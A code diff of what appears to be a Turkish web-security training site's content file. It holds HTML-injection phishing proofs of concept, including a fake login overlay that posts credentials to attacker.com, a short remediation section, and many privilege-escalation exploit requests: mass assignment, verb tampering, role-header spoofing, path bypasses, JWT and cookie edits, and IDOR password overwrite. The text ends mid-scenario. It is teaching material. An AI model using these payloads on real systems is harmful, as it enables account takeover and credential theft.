+            title: '4. PoC Senaryoları (Kimlik Avı & Manipülasyon)',
+            content: `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:12px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">Senaryo 1: Sahte Giriş Formu Enjeksiyonu (In-Site Phishing)</strong>
+                  <p class="small" style="margin-bottom:6px;">Yorum veya açıklama alanına kurbanın bilgilerini çalacak form gömülür:</p>
+                  <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;font-size:12px;color:#d6f4ff;white-space:pre-wrap;">&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#09090b;z-index:9999;padding:40px;"&gt;
+  &lt;h3&gt;Oturum Süreniz Doldu. Lütfen Tekrar Giriş Yapın:&lt;/h3&gt;
+  &lt;form action="https://attacker.com/collect" method="POST"&gt;
+    &lt;input type="text" name="user" placeholder="E-posta"&gt;&lt;br&gt;&lt;br&gt;
+    &lt;input type="password" name="pass" placeholder="Şifre"&gt;&lt;br&gt;&lt;br&gt;
+    &lt;button type="submit"&gt;Giriş Yap&lt;/button&gt;
+  &lt;/form&gt;
+&lt;/div&gt;</pre>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:6px;">Senaryo 2: Görsel Tahrifatı & Bağlantı Manipülasyonu</strong>
+                  <p class="small" style="margin-bottom:6px;">Meşru butonun veya duyurunun yerine yönlendirici sahte görsel yerleştirme:</p>
+                  <pre style="background:rgba(0,0,0,0.3);padding:8px;border-radius:6px;margin:0;font-size:12px;color:#d6f4ff;white-space:pre-wrap;">&lt;a href="https://attacker.com/fake-login" target="_blank"&gt;
+  &lt;img src="https://attacker.com/login-btn.png" alt="Oturum Aç" style="width:200px;"&gt;
+&lt;/a&gt;</pre>
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '5. Savunma ve Doğru Yapılandırma (Remediation)',
+            content: `
+              <ul style="list-style:none;padding:0;margin:0;display:grid;gap:10px">
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">1. Bağlamsal Çıktı Kodlama (Context-Aware Output Encoding):</strong>
+                  Kullanıcıdan gelen veriler sayfaya basılmadan önce HTML metakarakterleri dönüştürülmelidir:
+                  <div class="small" style="margin-top:6px; line-height:1.6;">
+                    <code>&amp;</code> &rarr; <code>&amp;amp;</code><br>
+                    <code>&lt;</code> &rarr; <code>&amp;lt;</code><br>
+                    <code>&gt;</code> &rarr; <code>&amp;gt;</code><br>
+                    <code>"</code> &rarr; <code>&amp;quot;</code><br>
+                    <code>'</code> &rarr; <code>&amp;#x27;</code>
+                  </div>
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">2. Güvenli Kütüphaneler & Şablon Motorları:</strong>
+                  HTML oluştururken manuel string birleştirme yerine otomatik encode eden modern şablon sistemleri tercih edilmelidir (Jinja2, Blade, Angular/React veri bağlama).
+                </li>
+                <li style="background:rgba(255,255,255,0.02);padding:12px;border-radius:8px;color:var(--muted);font-size:14px">
+                  <strong style="color:#cbd5e1;display:block;margin-bottom:4px;">3. Form Eylemlerini Sınırlandırma (CSP form-action):</strong>
+                  Sayfaya harici adreslere veri gönderen sahte formlar gömülmesini engellemek için Content Security Policy uygulanmalıdır:
+                  <pre style="background:rgba(0,0,0,0.3);padding:6px;border-radius:4px;margin-top:4px;color:#d6f4ff;font-family:monospace;font-size:12px;">Content-Security-Policy: form-action 'self';</pre>
+                </li>
+              </ul>
+            `
           }
         ]
       },
 
-      privilege_escalation: {
+privilege_escalation: {
         menuName: 'Privilege Escalation',
         icon: 'icon-priv-esc',
         parent: 'vulnerabilities',
         title: 'Privilege Escalation (Yetki Yükseltme)',
-        description: 'Bir kullanıcının sahip olduğundan daha yüksek izinlere (yatay veya dikey) sahip olması veya kritik bir işlemi gerçekleştirmesi.',
+        description: 'Erişim kontrolü (Access Control / Authorization) mekanizmalarının yetersizliği sonucu kullanıcıların yetkisiz verilere erişmesi (Yatay) veya idari rolleri devralması (Dikey) zafiyeti.',
         sections: [
           {
-            title: 'Özet Bilgi ve Dikey/Yatay Farkı',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Yatay Yükseltme:</strong> Aynı seviye roller arası geçiş (IDOR). Kendi profilinizden başka bir kullanıcının profiline erişim.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Dikey Yükseltme:</strong> Düşük rolden yüksek role geçiş (Admin Panel erişimi, rol değiştirme).</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px">Bu zafiyetin ana nedeni: Sunucunun yetki kontrolünü istemciye bırakması veya hatalı uygulaması.</li>
-            </ul>`
+            title: '1. Yetki Yükseltme Mimarisi ve Türleri',
+            content: `
+              <p class="small" style="margin-bottom:12px; line-height:1.6;">
+                Yetki Yükseltme (Privilege Escalation); kimlik doğrulamasından (Authentication) geçen bir kullanıcının, erişim kontrolü (Authorization) katmanındaki tasarım ve mantık hataları nedeniyle kendi sınırlarını aşmasıdır.
+              </p>
+              <div class="tool-io-grid" style="margin-bottom:14px;">
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">Yatay Yetki Yükseltme (Horizontal)</h4>
+                  <p class="small" style="margin:0 0 6px 0;">Kullanıcının aynı yetki seviyesindeki başka bir kullanıcının kaynaklarına erişmesidir (IDOR / BOLA).</p>
+                  <p class="small" style="margin:0; color:var(--muted);"><b>Örnek:</b> Kullanıcı A'nın profil parametresini <code>id=101</code> yerine <code>id=102</code> yaparak başka bir kullanıcının verilerini okuması veya değiştirmesi.</p>
+                </div>
+                <div class="card" style="margin-bottom:0; border: 1px solid var(--border);">
+                  <h4 style="font-size:13px; color:#cbd5e1;">Dikey Yetki Yükseltme (Vertical)</h4>
+                  <p class="small" style="margin:0 0 6px 0;">Düşük ayrıcalıklı standart bir kullanıcının, doğrudan yüksek yetkili (Admin, Moderator) işlevleri yürütmesidir.</p>
+                  <p class="small" style="margin:0; color:var(--muted);"><b>Örnek:</b> Standart üyenin doğrudan <code>/api/admin/users/delete</code> uç noktasına istek gönderebilmesi veya rol parametresini ezmesi.</p>
+                </div>
+              </div>
+              <div class="card" style="border-left: 2px solid var(--secondary); background:rgba(6,182,212,0.05);">
+                <strong style="color:var(--secondary); font-size:13px;">Çok Kiracılı (Multi-Tenant) İzolasyon Kırılması</strong>
+                <p class="small" style="margin:4px 0 0 0;">
+                  Farklı organizasyonlara hizmet veren SaaS sistemlerinde, bir kurumun yöneticisinin diğer kurumun kaynaklarını yönetebilmesidir. Rol denetimi yapılsa bile kiracı (tenant/organization_id) doğrulaması eksik olduğunda görülür.
+                </p>
+              </div>
+            `
           },
           {
-            title: 'Hızlı Tespit ve Nerede Aranır?',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>1. İki Hesap Tekniği:</strong> Bir Düşük Yetkili (User) ve bir Yüksek Yetkili (Admin) hesabı oluşturun. Admin'in yaptığı işlemi User'ın token'ı ile tekrarlamayı deneyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>2. Endpoint Tahmini:</strong> Normal kullanıcı olarak login olduktan sonra <code>/admin/users</code>, <code>/api/v1/update-role</code>, <code>/config</code> gibi URL'leri ziyaret etmeyi deneyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>3. Kaynak Kodu:</strong> JavaScript dosyalarında <code>if (user.role === 'admin')</code> gibi yetki kontrolü yapan client-side kodları arayın (Bu sadece bir ipucudur, asıl kontrol server'da olmalıdır).</li>
-            </ul>`
+            title: '2. Mimari Kök Nedenler ve Zayıflık Noktaları',
+            content: `
+              <div style="overflow-x:auto; margin-bottom:12px;">
+                <table style="width:100%; border-collapse:collapse; font-size:13px; color:var(--muted); background:rgba(255,255,255,0.02); border-radius:8px; overflow:hidden;">
+                  <thead>
+                    <tr style="border-bottom:1px solid var(--glass);">
+                      <th style="text-align:left; padding:8px; color:var(--accent);">Zayıflık Türü</th>
+                      <th style="text-align:left; padding:8px; color:var(--accent);">Mekanizma</th>
+                      <th style="text-align:left; padding:8px; color:var(--accent);">Etki</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>İstemci Taraflı Kontrol</b></td>
+                      <td style="padding:8px;">Erişim kurallarının yalnızca arayüzde (JavaScript, gizlenen butonlar) uygulanıp API seviyesinde denetlenmemesi.</td>
+                      <td style="padding:8px; color:#ef4444;">Kritik</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Mass Assignment (Auto-Binding)</b></td>
+                      <td style="padding:8px;">Gelen JSON/Form verisinin veri modeliyle doğrudan filtrelenmeksizin eşleştirilmesi (rol alanlarının ezilmesi).</td>
+                      <td style="padding:8px; color:#ef4444;">Yüksek</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>HTTP Metot Tutarsızlığı</b></td>
+                      <td style="padding:8px;">Yetki katmanının belirli metotları (GET) denetleyip alternatif metotları (PUT, POST) denetimsiz bırakması.</td>
+                      <td style="padding:8px; color:#facc15;">Orta / Yüksek</td>
+                    </tr>
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.05);">
+                      <td style="padding:8px; color:#cbd5e1;"><b>Güvenilmeyen Başlıklara Bağımlılık</b></td>
+                      <td style="padding:8px;">Yetkilendirmenin istemci tarafından gönderilen özel başlıklara (<code>X-User-Role</code> vb.) göre yapılması.</td>
+                      <td style="padding:8px; color:#ef4444;">Kritik</td>
+                    </tr>
+                    <tr>
+                      <td style="padding:8px; color:#cbd5e1;"><b>Yol Normalizasyon Hataları</b></td>
+                      <td style="padding:8px;">Ters vekil (reverse proxy) ile uygulama sunucusunun URL çözümleme farkları (örn: <code>/admin/..;/path</code>).</td>
+                      <td style="padding:8px; color:#facc15;">Yüksek</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            `
           },
           {
-            title: 'Bypass Teknikleri (JSON / Parameter Manipülasyonu)',
-            content: `<ul style="list-style:none;padding:0;margin:0;display:grid;gap:8px">
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Mass Assignment:</strong> Kullanıcının gönderdiği JSON/Form verisine <code>"role": "admin"</code> veya <code>"is_admin": true</code> gibi normalde gönderilmemesi gereken bir parametre eklemeyi deneyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Metod/Header Değiştirme:</strong> User hesabıyla <code>GET /api/delete-user</code> isteği 403 veriyorsa, isteği <code>POST</code> veya <code>DELETE</code> olarak değiştirip tekrar deneyin.</li>
-                <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px"><strong>Yüksek Yetki Fonksiyonu:</strong> Normal bir kullanıcı fonksiyonunu (örneğin <code>/api/profile-update</code>) Admin'in User ID'sini hedef alarak kullanmayı deneyin.</li>
-            </ul>`
-          },
-          {
-            title: 'PoC Örnekleri (Rol Değiştirme)',
-            content: `<pre>
-// User A olarak yakalanan istek:
-POST /api/users/update
+            title: '3. Mass Assignment ve Parametre Bağlama Mantığı',
+            content: `
+              <p class="small" style="margin-bottom:10px;">
+                Modern framework'lerde istemciden gelen istek gövdesi doğrudan veri tabanı nesnesine dönüştürülür. Geliştirici hangi alanların değiştirilebilir olduğunu açıkça sınırlandırmazsa rol ve yetki alanları manipüle edilebilir.
+              </p>
+              <div style="display:grid; gap:10px; margin-bottom:14px;">
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);" open>
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">1. Rol Alanı Enjeksiyonu (Model Binding)</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid var(--accent);">
+                    <p class="small" style="margin:0 0 6px 0;">Profil güncelleme akışında standart verilerin yanına yetki alanlarının eklenmesi:</p>
+                    <pre style="margin:0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); font-size:12px; color:#d6f4ff;">
+// Standart Beklenen Gövde:
 {
-    "id": "USER_ID",
-    "username": "new_name"
+  "username": "ahmet",
+  "email": "ahmet@target.com"
+}
+
+// Model Seviyesinde Filtrelenmeyen Gövde:
+{
+  "username": "ahmet",
+  "email": "ahmet@target.com",
+  "role": "admin",
+  "is_admin": true,
+  "verified": true
 }</pre>
-<p class="small"><strong>Yetki Yükseltme PoC:</strong> JSON'a <code>"id": "ADMIN_ID", "role": "admin"</code> eklemeyi deneyin (Mass Assignment).</p>
-<pre>
-POST /api/users/update
+                  </div>
+                </details>
+
+                <details class="accordion-menu" style="border:1px solid rgba(255,255,255,0.05); border-radius:8px; padding:6px; background:rgba(255,255,255,0.01);">
+                  <summary style="cursor:pointer; font-weight:bold; color:#cbd5e1; padding:6px;">2. Oturum Bağlamı Yerine Rota Kimliğine Güvenilmesi</summary>
+                  <div class="card" style="margin:8px 0 0 0; border-left:2px solid var(--secondary);">
+                    <p class="small" style="margin:0 0 6px 0;">Sunucu kimlik bilgisini oturumdan (Session/JWT) almak yerine rota parametresinden veya JSON gövdesinden okuduğunda:</p>
+                    <pre style="margin:0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); font-size:12px; color:#d6f4ff;">
+PUT /api/v1/users/1001 HTTP/1.1
+Content-Type: application/json
+
 {
-    "id": "USER_ID",
-    "username": "new_name",
-    "role": "admin" // KRİTİK İSTEK
-}</pre>`
+  "email": "attacker@evil.com",
+  "role_id": 1
+}</pre>
+                    <p class="small" style="margin:6px 0 0 0; color:var(--muted);">Kullanıcı 1002 olmasına rağmen 1001 numaralı hesap üzerinde doğrudan güncelleme yapabilir.</p>
+                  </div>
+                </details>
+              </div>
+            `
+          },
+          {
+            title: '4. Denetim ve Metodolojik Analiz Adımları',
+            content: `
+              <ul style="list-style:none; padding:0; margin:0; display:grid; gap:10px;">
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#cbd5e1;">Adım 1: İki Hesap Karşılaştırma Matrisi (Dual-Account Testing)</strong>
+                  <p class="small" style="margin:4px 0 0 0;">Farklı yetkilerde iki hesap açılır (Düşük Yetkili Kullanıcı ve Yönetici). Yöneticinin gerçekleştirdiği işlemlerin HTTP şablonları yakalanarak aynı rotalar düşük yetkili oturum anahtarlarıyla test edilir.</p>
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#cbd5e1;">Adım 2: Rota ve Fonksiyon Keşfi</strong>
+                  <p class="small" style="margin:4px 0 0 0;">JavaScript paketleri (JS bundles), API swagger dökümanları veya kaynak kod analiziyle normal kullanıcı menüsünde gizlenmiş idari rotalar (<code>/admin/export</code>, <code>/api/v1/roles</code>) taranır.</p>
+                </li>
+                <li style="background:rgba(255,255,255,0.02); padding:12px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <strong style="color:#cbd5e1;">Adım 3: HTTP Metot Alternatifleri (Verb Tampering)</strong>
+                  <p class="small" style="margin:4px 0 0 0;">GET metodu 403 Forbidden dönüyorsa POST, PUT, DELETE veya <code>X-HTTP-Method-Override: PUT</code> başlığı ile filtrenin davranış tutarlılığı sınanır.</p>
+                </li>
+              </ul>
+            `
+          },
+          {
+            title: '5. Detaylı Senaryolar & Exploit Vektörleri',
+            content: `
+              <ul style="list-style:none; padding:0; margin:0; display:grid; gap:8px;">
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 1 - Profil Güncellemede Mass Assignment (Rol Ezme)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Kullanıcı profili güncellenirken sunucu modelin <code>role</code> özelliğini allowlist filtrelemesine tabi tutmuyor.<br>
+                      <strong style="margin-top:6px; display:block;">Orijinal İstek:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#d6f4ff;">PATCH /api/users/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer USER_TOKEN
+Content-Type: application/json
+
+{"full_name": "Test User", "bio": "Pentester"}</pre>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">PATCH /api/users/profile HTTP/1.1
+Host: target.com
+Authorization: Bearer USER_TOKEN
+Content-Type: application/json
+
+{"full_name": "Test User", "bio": "Pentester", "role": "admin", "is_admin": true}</pre>
+                      <p class="small" style="margin-top:4px;">Sunucu 200 OK döner ve oturumdaki kullanıcı doğrudan yönetici yetkisi kazanır.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 2 - HTTP Metot Değiştirme (Verb Tampering)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Güvenlik filtresi yalnızca <code>GET /admin/users</code> rotasını engelliyor ancak <code>POST</code> veya <code>PUT</code> isteklerini kontrol etmiyor.<br>
+                      <strong style="margin-top:6px; display:block;">Engellenen İstek:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#ef4444;">GET /admin/users/12 HTTP/1.1
+-> 403 Forbidden</pre>
+                      <strong style="margin-top:6px; display:block;">Bypass İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /admin/users/12 HTTP/1.1
+X-HTTP-Method-Override: GET
+Authorization: Bearer USER_TOKEN
+-> 200 OK (Kullanıcı detayları listelenir)</pre>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 3 - Güvenilmeyen Rol Başlığı (Header Injection)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Arka uç API'si, reverse proxy veya mikroservisten geldiğini varsaydığı özel başlığa körü körüne güveniyor.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">GET /api/v1/dashboard/metrics HTTP/1.1
+Host: target.com
+Authorization: Bearer USER_TOKEN
+X-User-Role: Administrator
+X-Role: admin
+X-Is-Superuser: 1</pre>
+                      <p class="small" style="margin-top:4px;">Reverse proxy başlığı filtrelemiyorsa veya doğrudan backend'e ulaşılabiliyorsa idari veriler döner.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 4 - Yol Normalizasyonu (Path Traversal Bypass)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> WAF veya ters vekil katmanı <code>/admin</code> ile başlayan yolları blokluyor, ancak backend URL normalizasyonu yapıyor.<br>
+                      <strong style="margin-top:6px; display:block;">Bypass Denemeleri:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">GET /api/v1/public/..;/admin/users HTTP/1.1
+GET /ADMIN/users HTTP/1.1
+GET /admin/. HTTP/1.1
+GET /api/v1/users;role=admin HTTP/1.1</pre>
+                      <p class="small" style="margin-top:4px;">Özellikle Spring Boot, Nginx ve IIS kombinasyonlarında noktalı virgül (<code>;</code>) veya çift eğik çizgi yetki filtresini atlatabilir.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 5 - Kayıt Formunda Rol Seçimi (Registration Tampering)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Kayıt sırasında rol parametresi varsayılan olarak istemci tarafından gönderilmiyor ancak backend şemada kabul ediliyor.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /api/register HTTP/1.1
+Content-Type: application/json
+
+{
+  "email": "hacker@test.com",
+  "password": "Password123!",
+  "role_id": 1,
+  "role": "SuperAdmin",
+  "account_type": "enterprise_admin"
+}</pre>
+                      <p class="small" style="margin-top:4px;">Kullanıcı doğrudan yönetici rolüyle oluşturulur.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 6 - Cookie Parametresi Manipülasyonu</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Oturum çerezi sunucuda tutulan rastgele bir token yerine doğrudan kullanıcı yetki durumunu şifresiz taşır.<br>
+                      <strong style="margin-top:6px; display:block;">Orijinal İstek:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#d6f4ff;">GET /admin/settings HTTP/1.1
+Cookie: session=xyz; role=user; is_admin=false
+-> 403 Forbidden</pre>
+                      <strong style="margin-top:6px; display:block;">Manipüle Edilmiş İstek:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">GET /admin/settings HTTP/1.1
+Cookie: session=xyz; role=admin; is_admin=true
+-> 200 OK</pre>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 7 - JWT Claim Manipülasyonu (Rol Alanı Değişimi)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> JWT tokenı sunucuda zayıf gizli anahtarla imzalanmıştır veya imza denetimi atlanabilmektedir (<code>alg: none</code>).<br>
+                      <strong style="margin-top:6px; display:block;">Orijinal Payload:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#d6f4ff;">{"sub": "105", "name": "user", "role": "standard_user"}</pre>
+                      <strong style="margin-top:6px; display:block;">Değiştirilmiş Payload:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">{"sub": "105", "name": "user", "role": "admin"}</pre>
+                      <p class="small" style="margin-top:4px;">Yeni token ile idari uç noktalara istek atılarak dikey yetki yükseltme tamamlanır.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 8 - IDOR ile Başka Kullanıcının Şifresini Güncelleme</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Şifre sıfırlama veya güncelleme rotası hedef kullanıcının kimliğini oturumdan değil, parametreden alır.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /api/users/change-password HTTP/1.1
+Content-Type: application/json
+Authorization: Bearer USER_TOKEN
+
+{
+  "target_user_id": 1,
+  "new_password": "NewAdminPassword123!"
+}</pre>
+                      <p class="small" style="margin-top:4px;">Yönetici kullanıcısının (ID: 1) şifresi doğrudan ezilerek hesap ele geçirilir.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 9 - Çok Kiracılı SaaS Sisteminde Organizasyon Değişimi</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Kullanıcı kendi şirketinin yöneticisidir, ancak istekteki <code>org_id</code> parametresi doğrulanmamaktadır.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">GET /api/v1/organization/invoices?org_id=205 HTTP/1.1
+Authorization: Bearer ORG_101_ADMIN_TOKEN</pre>
+                      <p class="small" style="margin-top:4px;">Kullanıcı 101 numaralı şirketin yöneticisi olmasına rağmen 205 numaralı rakip şirketin faturalarına erişir.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 10 - API Sürüm Farklılığı (v2 Güvenli, v1 Zafiyetli)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Yeni API rotası (v2) yetki denetimi yaparken eski sürüm (v1) halen aktiftir ve kontrol içermez.<br>
+                      <strong style="margin-top:6px; display:block;">Bypass İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">// v2 Yetki Hatası Verir:
+GET /api/v2/admin/logs -> 403 Forbidden
+
+// v1 Eski Rota Başarılı Olur:
+GET /api/v1/admin/logs -> 200 OK</pre>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 11 - GraphQL Yetkilendirilmemiş Sorgu (Query Injection)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> GraphQL şemasında kullanıcı arayüzünde görünmeyen idari query ve mutation'lar yetki kısıtlaması olmaksızın çalıştırılabilir.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit Query:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /graphql HTTP/1.1
+Content-Type: application/json
+
+{
+  "query": "mutation { updateUserRole(userId: 105, newRole: ADMIN) { success } }"
+}</pre>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 12 - İstemci Doğrulamalı Adım Atlama (Multi-Step Bypass)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Adım adım ilerleyen idari işlemlerde (örn: Adım 1: Onay -> Adım 2: Rol Ata), son adımın önceki adımların tamamlandığını doğrulamaması.<br>
+                      <strong style="margin-top:6px; display:block;">Exploit İsteği:</strong>
+                      <pre style="margin:4px 0; white-space:pre-wrap; padding:8px; border-radius:6px; background:rgba(0,0,0,0.3); color:#00ff88;">POST /admin/wizard/step-final HTTP/1.1
+Content-Type: application/json
+
+{"user_id": 105, "action": "grant_admin", "approved": true}</pre>
+                      <p class="small" style="margin-top:4px;">Yönetici onay ekranı hiç ziyaret edilmeden doğrudan son tamamlama endpoint'i çağrılır.</p>
+                    </div>
+                  </details>
+                </li>
+
+                <li style="background:rgba(255,255,255,0.02); padding:10px; border-radius:8px; color:var(--muted); font-size:14px;">
+                  <details>
+                    <summary style="cursor:pointer; font-weight:bold;">Senaryo 13 - URL Uzantısı ile Filtre Atlama (.json / .action)</summary>
+                    <div style="margin-top:10px;">
+                      <strong>Zafiyet:</strong> Yetki kontrol katmanı yalnızca düz metin yollarını kontrol eder, uzantılı yolları statik dosya sayıp filtreden geçirir.<br>
+                      <strong style="margin-top:6px; display:block;">Bypass İsteği:</strong>
